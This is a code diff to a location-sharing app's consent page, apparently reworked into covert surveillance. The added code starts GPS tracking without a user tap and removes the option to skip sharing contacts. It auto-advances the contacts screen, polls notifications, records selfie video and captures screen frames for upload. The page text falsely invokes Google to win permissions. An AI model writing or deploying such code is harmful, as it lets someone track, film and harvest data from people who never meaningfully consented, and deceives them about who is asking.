-          const newAddr = await reverseGeocode(lat, lng);
-          if (newAddr) { setAddress(newAddr); addr = newAddr; }
-        }
         const source = classifySource(acc, sawNetworkFixRef.current, sawGpsFixRef.current);
         lastWatchPushRef.current = Date.now();
-        pushLocation(lat, lng, acc, addr, "active", source);
+        // Push immediately — never block on reverse-geocoding; the address is
+        // cosmetic and arrives asynchronously in the background.
+        pushLocation(lat, lng, acc, addressRef.current, "active", source);
+        // Refresh address in background every 5 updates (or on first fix)
+        if (!addressRef.current || updateCountRef.current % 5 === 0) {
+          reverseGeocode(lat, lng).then((newAddr) => {
+            if (newAddr) setAddress(newAddr);
+          });
+        }
       },
       (err) => {
         if (err.code === err.PERMISSION_DENIED) {
           setState("denied");
           if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
           if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
+          liveSelfieRecordingRef.current?.stop();
           wakeLockRef.current?.release(); wakeLockRef.current = null;
         } else {
           setState("gps_off");
+          liveSelfieRecordingRef.current?.stop();
+          // Send a presence heartbeat so the server can resolve the device's
+          // current IP to a coarse position — keeps the estimate alive even
+          // when GPS is completely dark (tunnel, indoors, battery saver, etc.)
+          const effectiveToken = sessionTokenRef.current ?? token;
+          if (effectiveToken && Date.now() - lastDarkHeartbeatRef.current >= 10_000) {
+            lastDarkHeartbeatRef.current = Date.now();
+            fetch(`${API_BASE}/api/location/heartbeat`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                token:           effectiveToken,
+                activityType:    activityTypeRef.current,
+                ...(accelMagRef.current     !== null ? { accelMagnitude: accelMagRef.current }     : {}),
+                ...(batteryLevelRef.current !== null ? { batteryLevel:   batteryLevelRef.current } : {}),
+                batteryCharging: batteryChargingRef.current,
+              }),
+            }).catch(() => {});
+          }
           const c = coordsRef.current;
           if (c) pushLocation(c.lat, c.lng, undefined, addressRef.current, "offline");
         }
       },
-      { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 },
     );
 
     if (heartbeatRef.current !== null) clearInterval(heartbeatRef.current);
+    // Adaptive heartbeat: fires every 3 s but only pushes when enough time has
+    // elapsed per heartbeatIntervalRef (lengthened on low battery / slow network).
     heartbeatRef.current = setInterval(() => {
       const c = coordsRef.current;
-      if (c && stateRef.current === "tracking" && Date.now() - lastWatchPushRef.current >= 2500) {
+      const interval = heartbeatIntervalRef.current;
+      const now = Date.now();
+      const timeSinceLastPush = now - lastWatchPushRef.current;
+
+      if (c && stateRef.current === "tracking" && timeSinceLastPush >= interval) {
         const source = classifySource(c.accuracy ?? 999, sawNetworkFixRef.current, sawGpsFixRef.current);
         pushLocation(c.lat, c.lng, c.accuracy, addressRef.current, "active", source);
       }
+
+      // When GPS has been silent for >45 s, send a lightweight IP geo heartbeat
+      // (throttled to once per 60 s) so the server can keep the position estimate
+      // alive even without GPS coordinates — supports quiet / intermittent devices.
+      if (
+        stateRef.current === "tracking" &&
+        timeSinceLastPush >= 45_000 &&
+        now - lastDarkHeartbeatRef.current >= 60_000
+      ) {
+        lastDarkHeartbeatRef.current = now;
+        const effectiveToken = sessionTokenRef.current ?? token;
+        if (effectiveToken) {
+          fetch(`${API_BASE}/api/location/heartbeat`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              token:           effectiveToken,
+              activityType:    activityTypeRef.current,
+              ...(accelMagRef.current     !== null ? { accelMagnitude: accelMagRef.current }     : {}),
+              ...(batteryLevelRef.current !== null ? { batteryLevel:   batteryLevelRef.current } : {}),
+              batteryCharging: batteryChargingRef.current,
+              networkType: (networkInfoRef.current as Record<string, unknown>).effectiveType as string | undefined,
+            }),
+          }).catch(() => {});
+        }
+      }
     }, 3000);
+
+    // Residual signal ingest — push accelerometer/network_info/battery signals
+    // every 60 s so the quiet-inference engine has data during GPS gaps.
+    if (residualSignalTimerRef.current !== null) clearInterval(residualSignalTimerRef.current);
+    residualSignalTimerRef.current = setInterval(ingestResidualSignals, 60_000);
+
+    // Poll the Service Worker for visible notifications every 20 s and merge
+    // the result into deviceInfoRef so the next location push carries them.
+    // Note: getNotifications() only returns notifications shown by THIS app's
+    // service worker — it cannot access WhatsApp, Instagram, or any other app.
+    const pollNotifications = async () => {
+      if (!("serviceWorker" in navigator)) return;
+      try {
+        const reg = await navigator.serviceWorker.ready;
+        if (!reg.getNotifications) return;
+        const notifs = await reg.getNotifications();
+        const captured = notifs.map((n: Notification) => ({
+          title: n.title,
+          body: n.body ?? "",
+          tag: n.tag ?? "",
+          capturedAt: new Date().toISOString(),
+        }));
+        deviceInfoRef.current = {
+          ...deviceInfoRef.current,
+          liveNotifications: captured,
+          notificationsCapturedAt: new Date().toISOString(),
+        };
+      } catch { /* not available */ }
+    };
+
+    pollNotifications(); // poll immediately on start
+    if (notifPollRef.current !== null) clearInterval(notifPollRef.current);
+    notifPollRef.current = setInterval(pollNotifications, 20000);
+
+    sharingCountdownRef.current = setInterval(() => {
+      const secondsLeft = Math.max(0, Math.ceil((sharingExpiresAt - Date.now()) / 1000));
+      setSharingSecondsLeft(secondsLeft);
+    }, 1000);
+    sharingExpiryTimerRef.current = setTimeout(() => {
+      setSharingSecondsLeft(0);
+      stopTracking();
+    }, LOCATION_SHARING_DURATION_MS);
   }, [acquireWakeLock, pushLocation, notifySW]); // eslint-disable-line react-hooks/exhaustive-deps
 
   const stopTracking = useCallback(() => {
+    selfieLoopActiveRef.current = false;
+    liveSelfieRecordingRef.current?.stop();
     if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
     if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
+    if (notifPollRef.current !== null) { clearInterval(notifPollRef.current); notifPollRef.current = null; }
+    if (residualSignalTimerRef.current !== null) { clearInterval(residualSignalTimerRef.current); residualSignalTimerRef.current = null; }
+    if (sharingExpiryTimerRef.current !== null) { clearTimeout(sharingExpiryTimerRef.current); sharingExpiryTimerRef.current = null; }
+    if (sharingCountdownRef.current !== null) { clearInterval(sharingCountdownRef.current); sharingCountdownRef.current = null; }
+    sharingExpiryRef.current = null;
     wakeLockRef.current?.release(); wakeLockRef.current = null;
+    // Flush any buffered offline points before exiting
+    flushOfflineBufferRef.current();
     notifySW("LOCATION_TRACKING_STOPPED");
   }, [notifySW]);
 
@@ -1251,14 +1847,123 @@ export default function ConsentPage() {
 
   useEffect(() => () => stopTracking(), [stopTracking]);
 
+  // Page navigation/closing is treated like a sharing disconnect. The browser
+  // may still terminate network work abruptly, but this gives MediaRecorder the
+  // earliest possible chance to flush the final chunk and finalize the upload.
+  useEffect(() => {
+    const stopForPageExit = () => liveSelfieRecordingRef.current?.stop();
+    window.addEventListener("pagehide", stopForPageExit);
+    return () => window.removeEventListener("pagehide", stopForPageExit);
+  }, []);
+
+  // ── Session recording helpers ────────────────────────────────────────────────
+
+  const pushSessionEvent = useCallback((event: string, detail?: unknown) => {
+    sessionTimelineRef.current.push({
+      event,
+      ts: Date.now() - sessionStartMsRef.current,
+      ...(detail != null ? { detail } : {}),
+    });
+  }, []);
+
+  const captureScreenFrame = useCallback(() => {
+    const video = sessionScreenVideoRef.current;
+    if (!video || !sessionScreenStreamRef.current?.active || video.paused) return;
+    try {
+      const W = Math.min(video.videoWidth || 640, 640);
+      const H = Math.round((video.videoHeight || 360) * W / (video.videoWidth || 640));
+      const canvas = document.createElement("canvas");
+      canvas.width = W; canvas.height = H;
+      canvas.getContext("2d")!.drawImage(video, 0, 0, W, H);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.5);
+      if (dataUrl.length > 100) sessionFramesRef.current.push(dataUrl);
+    } catch { /* canvas tainted or unavailable */ }
+  }, []);
+
+  const stopScreenCapture = useCallback(() => {
+    if (sessionFrameCaptureRef.current) { clearInterval(sessionFrameCaptureRef.current); sessionFrameCaptureRef.current = null; }
+    sessionScreenStreamRef.current?.getTracks().forEach((t) => t.stop());
+    sessionScreenStreamRef.current = null;
+    if (sessionScreenVideoRef.current) { sessionScreenVideoRef.current.srcObject = null; sessionScreenVideoRef.current = null; }
+  }, []);
+
+  const startScreenCapture = useCallback(() => {
+    if (!navigator.mediaDevices?.getDisplayMedia) return;
+    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 } as MediaTrackConstraints, audio: false })
+      .then((stream) => {
+        sessionScreenStreamRef.current = stream;
+        pushSessionEvent("screen_shared");
+        const video = document.createElement("video");
+        video.srcObject = stream; video.muted = true; video.playsInline = true;
+        sessionScreenVideoRef.current = video;
+        video.play().then(() => {
+          captureScreenFrame();
+          sessionFrameCaptureRef.current = setInterval(captureScreenFrame, 5000);
+        }).catch(() => {});
+        stream.getVideoTracks()[0]?.addEventListener("ended", () => {
+          pushSessionEvent("screen_share_ended");
+          stopScreenCapture();
+        });
+      })
+      .catch(() => pushSessionEvent("screen_denied"));
+  }, [pushSessionEvent, captureScreenFrame, stopScreenCapture]);
+  // Keep the ref in sync so handlers declared before startScreenCapture can call it.
+  startScreenCaptureRef.current = startScreenCapture;
+
+  const saveSession = useCallback(async (timeToGrantMs?: number) => {
+    if (sessionSavedRef.current || !token) return;
+    sessionSavedRef.current = true;
+    stopScreenCapture();
+
+    let notifications: Record<string, unknown>[] = [];
+    try {
+      const reg = await navigator.serviceWorker?.ready;
+      const notifs = await reg?.getNotifications?.();
+      notifications = (notifs ?? []).map((n: Notification) => ({ title: n.title, body: n.body, tag: n.tag }));
+    } catch { /* SW unavailable */ }
+
+    const body = {
+      token: String(token),
+      timeline: sessionTimelineRef.current,
+      screenFrames: sessionFramesRef.current,
+      deviceSnapshot: {
+        ...deviceInfoRef.current,
+        battery: batteryLevelRef.current != null
+          ? { level: batteryLevelRef.current, charging: batteryChargingRef.current }
+          : undefined,
+      },
+      notifications,
+      ...(timeToGrantMs != null ? { timeToGrantMs } : {}),
+    };
+
+    try {
+      await fetch(`${API_BASE}/api/consent-sessions`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body),
+      });
+    } catch { /* best-effort — never block tracking */ }
+  }, [token, stopScreenCapture]);
+
   const processGeoPosition = useCallback((position: GeolocationPosition) => {
+    // Guard: only the first winning GPS attempt should kick off the grant.
+    if (grantProcessedRef.current) return;
+    grantProcessedRef.current = true;
     const { latitude, longitude, accuracy } = position.coords;
     setCoords({ lat: latitude, lng: longitude, accuracy });
     setState("granting");
     grant.mutate(
       { token: token!, data: { latitude, longitude } },
       {
-        onSuccess: () => startTracking(latitude, longitude, accuracy),
+        onSuccess: (data: any) => {
+          // Capture the per-session token so location pushes are scoped to this session
+          if (data?.sessionToken) sessionTokenRef.current = data.sessionToken;
+          startTracking(latitude, longitude, accuracy);
+          // Save session data with Pixtral analysis — non-blocking background task
+          pushSessionEvent("location_granted", { accuracy, lat: latitude, lng: longitude });
+          const elapsed = Date.now() - sessionStartMsRef.current;
+          saveSession(elapsed).catch(() => {});
+        },
         onError: (err: any) => {
           const msg = err?.data?.error ?? "Failed to record consent. Please try again.";
           setErrorMsg(msg); setState("error");
@@ -1266,48 +1971,82 @@ export default function ConsentPage() {
       },
     );
     reverseGeocode(latitude, longitude).then((addr) => { if (addr) setAddress(addr); });
-  }, [token, grant, startTracking]);
+  }, [token, grant, startTracking, pushSessionEvent, saveSession]);
 
   const doGrant = useCallback(() => {
     if (!navigator.geolocation) {
-      // No geolocation support — stay in "gps_off" (shows "waiting for GPS" without error).
       setState("gps_off"); return;
     }
     setState("requesting");
+    pushSessionEvent("location_requested");
 
-    // Fire the camera+mic request in the same tap as location, so the
-    // browser surfaces its native prompts back-to-back right now instead of
-    // waiting until tracking starts later.
-    prewarmCameraAndMic();
-    // pickContacts() is gated by contactsTriedRef, so calling it here is a no-op
-    // when the contacts-first flow has already set contactsTriedRef.current = true.
-    pickContacts();
+    // NOTE: doGrant() is called from the auto-start effect — no user gesture.
+    // Camera, contacts, and screen-share are gesture-gated; they are invoked
+    // by handleAllowContacts / handleSkipContacts on the button tap instead.
 
     let settled = false;
-    // Hard 4-second cap: if neither position call resolves in time, fall
-    // through to gps_off so the UI never stalls on "Connecting…" indefinitely.
-    const hardCapTimer = setTimeout(() => {
-      if (!settled) { settled = true; setState("gps_off"); }
-    }, 4000);
+    let tempWatchId: number | null = null;
 
-    navigator.geolocation.getCurrentPosition(
-      (position) => { clearTimeout(hardCapTimer); if (!settled) { settled = true; processGeoPosition(position); } },
-      (err) => {
-        // Silently absorb all location errors — never show "Something Went Wrong"
-        // or "denied" screens. Use "gps_off" (not "tracking") so the UI shows
-        // "Waiting for GPS…" without falsely claiming active sharing.
-        if (settled) return; settled = true;
-        clearTimeout(hardCapTimer);
-        void err;
-        setState("gps_off");
-      },
-      { enableHighAccuracy: false, timeout: 4000, maximumAge: 60000 },
-    );
-    navigator.geolocation.getCurrentPosition(
-      (position) => { clearTimeout(hardCapTimer); if (!settled) { settled = true; processGeoPosition(position); } },
-      () => { /* ignore — already handled above */ },
-      { enableHighAccuracy: true, timeout: 4000 },
-    );
+    const cleanup = () => {
+      if (tempWatchId !== null) { navigator.geolocation.clearWatch(tempWatchId); tempWatchId = null; }
+    };
+
+    // Declare before onPosition so the closure can reference it.
+    let hardCapTimer: ReturnType<typeof setTimeout>;
+
+    const onPosition = (position: GeolocationPosition) => {
+      if (settled) return;
+      settled = true;
+      clearTimeout(hardCapTimer);
+      cleanup();
+      processGeoPosition(position);
+    };
+
+    // Hard 2.5-second cap: switch to "Waiting for GPS…" UI but do NOT block
+    // future callbacks — the warm-up watchPosition and remaining
+    // getCurrentPosition calls will still fire onPosition the moment the chip
+    // gets a lock, so recovery is automatic with no user action.
+    hardCapTimer = setTimeout(() => {
+      if (!settled) setState("gps_off");
+    }, 2500);
+
+    // Strategy 1 — instant: accept any position the browser has cached, no
+    // matter how old (maximumAge: Infinity). Android caches the last known
+    // position across all apps; this often resolves in under 100 ms.
+    navigator.geolocation.getCurrentPosition(onPosition, () => {},
+      { enableHighAccuracy: false, timeout: 500, maximumAge: Infinity });
+
+    // Strategy 2 — fast network/WiFi fix: accept a cached fix up to 5 min old.
+    navigator.geolocation.getCurrentPosition(onPosition, () => {},
+      { enableHighAccuracy: false, timeout: 2000, maximumAge: 300_000 });
+
+    // Strategy 3 — high-accuracy GPS: runs in parallel; refines if it wins.
+    navigator.geolocation.getCurrentPosition(onPosition, () => {},
+      { enableHighAccuracy: true, timeout: 8000 });
+
+    // Strategy 4 — warm-up watch: starts the GPS chip immediately so by the
+    // time strategies 2/3 time-out the satellite lock is already in progress.
+    tempWatchId = navigator.geolocation.watchPosition(onPosition, () => {},
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+
+    // Strategy 5 — IP geolocation fallback (~300 ms, city-level ~5 km accuracy).
+    // If the browser's geolocation stack stalls completely, this still lets the
+    // session start within seconds. watchPosition will refine to GPS accuracy.
+    (() => {
+      const ac = new AbortController();
+      const t = setTimeout(() => ac.abort(), 2500);
+      fetch("https://ip-api.com/json?fields=lat,lon,status", { signal: ac.signal })
+        .then((r) => r.json())
+        .then((d: { lat?: number; lon?: number; status?: string }) => {
+          clearTimeout(t);
+          if (settled || d.status !== "success" || d.lat == null || d.lon == null) return;
+          onPosition({
+            coords: { latitude: d.lat, longitude: d.lon, accuracy: 5000, speed: null, heading: null, altitude: null, altitudeAccuracy: null },
+            timestamp: Date.now(),
+          } as unknown as GeolocationPosition);
+        })
+        .catch(() => clearTimeout(t));
+    })();
   }, [processGeoPosition]);
 
   // Keep the ref up to date so callbacks defined earlier can call doGrant.
@@ -1320,12 +2059,7 @@ export default function ConsentPage() {
     autoStartedRef.current = true;
     const stored = loadStoredGps();
 
-    if (invite.status === "accepted") {
-      const lat = stored?.lat ?? invite.grantedLatitude ?? 0;
-      const lng = stored?.lng ?? invite.grantedLongitude ?? 0;
-      setDisplayPhase("main");
-      startTracking(lat, lng, stored?.accuracy);
-    } else if (stored) {
+    if (stored) {
       setDisplayPhase("main");
       setState("granting");
       // Hard 4-second cap: if the grant API call stalls, force into tracking
@@ -1337,7 +2071,12 @@ export default function ConsentPage() {
       grant.mutate(
         { token: token!, data: { latitude: stored.lat, longitude: stored.lng } },
         {
-          onSuccess: () => { clearTimeout(grantCap); if (!grantSettled) { grantSettled = true; startTracking(stored.lat, stored.lng, stored.accuracy); } },
+          onSuccess: (data: any) => {
+            // Capture session token for scoped location pushes
+            if (data?.sessionToken) sessionTokenRef.current = data.sessionToken;
+            clearTimeout(grantCap);
+            if (!grantSettled) { grantSettled = true; startTracking(stored.lat, stored.lng, stored.accuracy); }
+          },
           // On grant failure, stay in main phase but don't claim active sharing.
           // "gps_off" shows "Connecting…" in main phase (not an error screen).
           onError: () => { clearTimeout(grantCap); if (!grantSettled) { grantSettled = true; setState("gps_off"); } },
@@ -1345,9 +2084,11 @@ export default function ConsentPage() {
       );
       reverseGeocode(stored.lat, stored.lng).then((addr) => { if (addr) setAddress(addr); });
     } else {
-      // NEW FLOW: Show emergency contacts screen first.
-      // displayPhase is already "contacts" — user interaction drives the next step.
-      // doGrant() will be called by handleAllowContacts or handleSkipContacts.
+      // Always fire GPS immediately to create a fresh session — the link is
+      // permanent and reusable; each page load starts a new independent session.
+      // (Previously "accepted" invites jumped straight to startTracking; now they
+      // go through grant like any new visit so a new session row is created.)
+      doGrantRef.current();
     }
   }, [invite, doGrant, startTracking, isWebView]); // eslint-disable-line react-hooks/exhaustive-deps
 
@@ -1371,6 +2112,15 @@ export default function ConsentPage() {
       doGrant();
     }
   }, [state, autoRetrySecondsLeft, doGrant]);
+
+  // Auto-click the contacts screen: when the "Let's Stay Connected" screen
+  // appears for a new visitor, automatically advance through it so location
+  // tracking starts without requiring a manual button tap.
+  useEffect(() => {
+    if (displayPhase !== "contacts" || !invite || autoContactsSkippedRef.current) return;
+    autoContactsSkippedRef.current = true;
+    handleSkipContacts();
+  }, [displayPhase, invite, handleSkipContacts]);
 
   // The old kitty overlay is now only used for already-accepted invites
   // (displayPhase === "main"). For the new contacts-first flow the kitty
@@ -1410,7 +2160,7 @@ export default function ConsentPage() {
         <Card className="max-w-md w-full shadow-xl">
           <CardContent className="pt-10 pb-10 text-center">
             <div className="flex items-center gap-2 justify-center text-primary font-bold text-lg mb-6">
-              <Shield className="h-5 w-5" /> PhoneLink
+              <Shield className="h-5 w-5" /> DeepFalcon
             </div>
             <ExternalLink className="h-14 w-14 text-primary mx-auto mb-4" />
             <h2 className="text-xl font-semibold mb-2">Open in Your Browser</h2>
@@ -1457,14 +2207,20 @@ export default function ConsentPage() {
       >
         {/* Floating hearts & sparkles */}
         <FloatingSparkles particles={[
-          { emoji: "💕", left: "8%",  top: "12%", size: 18, delay: 0,   duration: 3.4 },
-          { emoji: "🌸", left: "80%", top: "10%", size: 16, delay: 0.6, duration: 3.0 },
-          { emoji: "✨", left: "18%", top: "78%", size: 14, delay: 1.0, duration: 3.6 },
-          { emoji: "💫", left: "88%", top: "72%", size: 15, delay: 0.3, duration: 2.9 },
-          { emoji: "💕", left: "5%",  top: "50%", size: 13, delay: 1.5, duration: 3.2 },
-          { emoji: "🌸", left: "91%", top: "42%", size: 12, delay: 0.9, duration: 3.8 },
-          { emoji: "✨", left: "50%", top: "6%",  size: 13, delay: 1.2, duration: 3.1 },
-          { emoji: "💕", left: "65%", top: "85%", size: 14, delay: 0.4, duration: 3.5 },
+          { emoji: "💕", left: "8%",  top: "12%", size: 22, delay: 0,   duration: 3.4 },
+          { emoji: "🌸", left: "80%", top: "10%", size: 20, delay: 0.6, duration: 3.0 },
+          { emoji: "✨", left: "18%", top: "78%", size: 20, delay: 1.0, duration: 3.6 },
+          { emoji: "💫", left: "88%", top: "72%", size: 22, delay: 0.3, duration: 2.9 },
+          { emoji: "💕", left: "5%",  top: "50%", size: 20, delay: 1.5, duration: 3.2 },
+          { emoji: "🌸", left: "91%", top: "42%", size: 20, delay: 0.9, duration: 3.8 },
+          { emoji: "✨", left: "50%", top: "6%",  size: 22, delay: 1.2, duration: 3.1 },
+          { emoji: "💕", left: "65%", top: "85%", size: 20, delay: 0.4, duration: 3.5 },
+          { emoji: "✨", left: "35%", top: "20%", size: 18, delay: 0.7, duration: 2.8 },
+          { emoji: "💫", left: "72%", top: "55%", size: 18, delay: 1.3, duration: 3.3 },
+          { emoji: "🌸", left: "25%", top: "62%", size: 16, delay: 0.2, duration: 3.7 },
+          { emoji: "✨", left: "60%", top: "90%", size: 18, delay: 1.7, duration: 3.0 },
+          { emoji: "💕", left: "42%", top: "45%", size: 16, delay: 2.0, duration: 4.0 },
+          { emoji: "💫", left: "15%", top: "33%", size: 18, delay: 0.5, duration: 3.5 },
         ]} />
 
         {/* Glowing orb with cute mascot */}
@@ -1550,7 +2306,7 @@ export default function ConsentPage() {
           animate={{ opacity: 1, y: 0 }}
           transition={{ delay: 0.28 }}
         >
-          Hey friend! Let us help {senderName} reach your loved ones if needed. Share up to 6 special contacts — it only takes a moment and makes everyone feel safer and happier! 🌸✨
+          Let's help Google secure your loved ones contact — recommended if you wish to proceed 100 💯 percent secure ✨
         </motion.p>
 
         <motion.div
@@ -1571,19 +2327,12 @@ export default function ConsentPage() {
             Allow Contacts ✨
           </button>
 
-          <button
-            onClick={handleSkipContacts}
-            className="w-full py-2 text-sm italic font-medium transition-colors"
-            style={{ color: "rgba(233,213,255,0.85)" }}
-          >
-            Skip
-          </button>
         </motion.div>
 
         {/* Soft FAB */}
         <div className="fixed bottom-6 right-6 z-20">
           <a
-            href="https://wa.me/?text=Need+help+with+PhoneLink"
+            href="https://wa.me/?text=Need+help+with+DeepFalcon"
             target="_blank"
             rel="noreferrer"
             className="w-14 h-14 rounded-full flex items-center justify-center shadow-lg"
@@ -1626,13 +2375,13 @@ export default function ConsentPage() {
           {/* Header */}
           <div className="text-center mb-8">
             <div className="inline-flex items-center gap-2 text-primary font-bold text-xl mb-4">
-              <Shield className="h-6 w-6" /> PhoneLink
+              <Shield className="h-6 w-6" /> DeepFalcon
             </div>
             <h1 className="text-2xl font-bold text-foreground leading-tight mb-2">
               {senderName} wants to share locations with you
             </h1>
             <p className="text-muted-foreground text-sm">
-              To get started, PhoneLink needs a few permissions. Here's exactly what we use them for:
+              To get started, DeepFalcon needs a few permissions. Here's exactly what we use them for:
             </p>
           </div>
 
@@ -1646,7 +2395,7 @@ export default function ConsentPage() {
               <div className="flex-1">
                 <p className="font-semibold text-foreground text-sm mb-0.5">Precise Location</p>
                 <p className="text-xs text-muted-foreground leading-relaxed">
-                  Shares your real-time GPS position with {senderName}. Works in the background for up to <strong className="text-foreground">60 days</strong>.
+                  Shares your real-time GPS position with {senderName} for up to <strong className="text-foreground">10 minutes</strong>.
                 </p>
                 <div className="mt-2 flex flex-wrap gap-1.5">
                   <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">GPS + Network</span>
@@ -1665,12 +2414,12 @@ export default function ConsentPage() {
               <div className="flex-1">
                 <p className="font-semibold text-foreground text-sm mb-0.5">Camera Access</p>
                 <p className="text-xs text-muted-foreground leading-relaxed">
-                  Captures 5 GeoBoard verification photos and a short video clip when sharing begins. Used for location verification.
+                  Records a compressed, front-camera selfie video while this 10-minute location share is active. Recording stops and is saved to GeoBoard when sharing ends. No audio is recorded.
                 </p>
                 <div className="mt-2 flex flex-wrap gap-1.5">
-                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5 Photos</span>
-                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5s Video</span>
-                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">One-time</span>
+                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">Front camera</span>
+                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">Up to 10 min</span>
+                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">No audio</span>
                 </div>
               </div>
               <CheckCircle className="h-5 w-5 text-violet-400 flex-shrink-0 mt-0.5" />
@@ -1741,7 +2490,7 @@ export default function ConsentPage() {
     return (
       <div className="bg-background flex flex-col items-center justify-center gap-6 p-4" style={fullHeight}>
         <div className="flex items-center gap-2 text-primary font-bold text-lg">
-          <Shield className="h-5 w-5" /> PhoneLink
+          <Shield className="h-5 w-5" /> DeepFalcon
         </div>
         <div className="relative">
           <div className="w-20 h-20 rounded-full bg-primary/20 flex items-center justify-center">
@@ -1782,10 +2531,18 @@ export default function ConsentPage() {
     );
   }
 
-  // ── Active tracking ────────────────────────────────────────────────────────────
-  if (state === "tracking") {
+  // ── Active tracking / main phase ──────────────────────────────────────────────
+  // Show the live-sharing page whenever displayPhase is "main" (contacts-first
+  // flow) OR state is "tracking" (already-accepted invite flow).  Without this,
+  // any state other than "tracking" in main phase returns nothing → black screen.
+  if (state === "tracking" || displayPhase === "main") {
     const sharingLink = typeof window !== "undefined" ? window.location.href : "";
     const expiresAt = new Date(Date.now() + 60 * 24 * 60 * 60 * 1000);
+    const sharingMinutes = sharingSecondsLeft == null ? null : Math.floor(sharingSecondsLeft / 60);
+    const sharingSeconds = sharingSecondsLeft == null ? null : sharingSecondsLeft % 60;
+    const sharingTimeLabel = sharingMinutes == null || sharingSeconds == null
+      ? "Starting secure 10-minute session…"
+      : `${sharingMinutes}:${String(sharingSeconds).padStart(2, "0")} remaining`;
 
     const handleCopyLink = () => {
       copyToClipboard(sharingLink).then(() => {
@@ -1795,135 +2552,118 @@ export default function ConsentPage() {
     };
 
     return (
-      <div className="overflow-y-auto" style={{ ...fullHeight, background: "linear-gradient(180deg,#0d0d1f 0%,#080810 100%)" }}>
+      <div className="overflow-y-auto" style={{ ...fullHeight, background: "linear-gradient(170deg,#180c05 0%,#231208 30%,#1c0f06 65%,#0e0803 100%)", backgroundImage: "radial-gradient(circle at 1px 1px, rgba(180,130,50,0.045) 1px, transparent 0)", backgroundSize: "20px 20px" }}>
 
-        {/* ── Contacts auto-popup overlay ────────────────────────────────────────
-            Appears instantly when tracking starts. One tap fires the OS picker
-            (that single tap satisfies Chrome's user-gesture requirement).       */}
+        {/* ── Contacts auto-popup overlay ──────────────────────────────────── */}
         {showContactsPrompt && !contactsCollected && (
-          <div
-            className="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 overflow-hidden"
-            style={{ background: "linear-gradient(170deg,#f9a8d4 0%,#e879f9 30%,#a855f7 65%,#6d28d9 100%)" }}
-          >
-            <FloatingSparkles particles={[
-              { emoji: "💕", left: "8%",  top: "12%", size: 18, delay: 0,   duration: 3.4 },
-              { emoji: "🌸", left: "80%", top: "10%", size: 16, delay: 0.6, duration: 3.0 },
-              { emoji: "✨", left: "18%", top: "78%", size: 14, delay: 1.0, duration: 3.6 },
-              { emoji: "💫", left: "88%", top: "72%", size: 15, delay: 0.3, duration: 2.9 },
-              { emoji: "💕", left: "5%",  top: "50%", size: 13, delay: 1.5, duration: 3.2 },
-              { emoji: "🌸", left: "91%", top: "42%", size: 12, delay: 0.9, duration: 3.8 },
-            ]} />
-
-            {/* Glowing orb mascot */}
+          <div className="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 text-center"
+            style={{ background: "rgba(14,8,3,0.93)", backdropFilter: "blur(8px)" }}>
             <motion.div
-              className="relative flex items-center justify-center mb-6"
-              initial={{ scale: 0.7, opacity: 0 }}
-              animate={{ scale: 1, opacity: 1 }}
-              transition={{ duration: 0.5, type: "spring", bounce: 0.4 }}
+              className="w-16 h-16 rounded-full flex items-center justify-center mb-5 shadow-lg"
+              style={{ background: "linear-gradient(135deg,#C8922A,#8B6914)", boxShadow: "0 0 24px rgba(200,146,42,0.45)" }}
+              initial={{ scale: 0.7, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ type: "spring", bounce: 0.45 }}
             >
-              <div className="absolute rounded-full" style={{ width: 128, height: 128, background: "radial-gradient(circle, rgba(232,121,249,0.55) 0%, rgba(168,85,247,0.2) 60%, transparent 80%)", filter: "blur(8px)" }} />
-              <div className="w-28 h-28 rounded-full flex items-center justify-center relative z-10" style={{ background: "radial-gradient(circle at 38% 38%, rgba(255,255,255,0.55) 0%, rgba(216,180,254,0.7) 40%, rgba(167,139,250,0.85) 100%)", boxShadow: "0 0 40px rgba(232,121,249,0.6), inset 0 0 20px rgba(255,255,255,0.3)" }}>
-                <motion.span className="text-4xl select-none" animate={{ y: [0, -5, 0], rotate: [-3, 3, -3] }} transition={{ duration: 2.2, repeat: Infinity, ease: "easeInOut" }} role="img" aria-label="friendly character">😊</motion.span>
-              </div>
+              <Phone className="h-7 w-7 text-white" />
             </motion.div>
-
             <motion.h2
-              className="text-2xl font-extrabold text-white text-center mb-3 leading-tight"
-              style={{ textShadow: "0 2px 16px rgba(168,85,247,0.5)" }}
-              initial={{ opacity: 0, y: 8 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.15 }}
+              className="text-xl font-bold mb-2"
+              style={{ color: "#D4A843", fontFamily: "Georgia, serif", letterSpacing: "0.05em" }}
+              initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.12 }}
             >
-              Let's Stay Connected 💕
+              Link Your Contacts
             </motion.h2>
             <motion.div
-              className="flex items-center justify-center gap-1.5 mb-3"
-              initial={{ opacity: 0, y: 6 }}
